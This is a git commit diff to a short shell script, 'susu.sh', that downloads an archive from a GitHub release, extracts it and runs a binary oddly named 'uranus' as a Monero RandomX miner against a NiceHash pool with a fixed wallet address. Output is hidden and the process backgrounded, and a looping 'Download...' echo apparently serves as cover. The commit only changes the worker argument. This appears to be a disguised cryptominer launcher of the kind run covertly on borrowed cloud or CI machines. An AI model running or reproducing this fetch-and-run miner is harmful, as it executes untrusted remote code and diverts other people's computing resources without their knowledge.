108358656d2fd4eed55c1d25f021a6f7f8a23ab2
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-12 00:08:00 +0700

    Update susu.sh

--- susu.sh
+++ susu.sh
@@ -1,4 +1,4 @@
-wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o randomxmonero.hk.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.vivo -t 1 > /dev/null 2>&1 &
+wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o randomxmonero.hk.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f -p "RIG001" -t 1 > /dev/null 2>&1 &
 while true
 do
         echo "Download..."
